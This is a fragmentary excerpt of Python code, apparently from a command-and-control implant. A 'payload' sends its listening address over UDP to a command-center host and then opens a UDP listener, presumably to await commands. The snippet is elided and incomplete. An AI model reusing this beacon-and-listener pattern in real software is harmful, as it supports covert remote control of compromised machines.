...
def ping():
  ...
  """
  UDPSock.sendto("%s:%s" % (PAYLOAD_LISTEN_HOST, PAYLOAD_LISTEN_PORT), (COMMAND_CENTER_HOST, COMMAND_CENTER_PORT))
  logging.debug( 'Ping sent to "%s:%s" contains "%s:%s"' % ( COMMAND_CENTER_HOST, COMMAND_CENTER_PORT, PAYLOAD_LISTEN_HOST, PAYLOAD_LISTEN_PORT  ))
...
if __name__ == "__main__":
  logging.info ( "Payload is listening on %s:%s..." % ( PAYLOAD_LISTEN_HOST, PAYLOAD_LISTEN_PORT ) )
  listener = SocketServer.UDPServer( ( PAYLOAD_LISTEN_HOST, PAYLOAD_LISTEN_PORT ), UDPHandler )
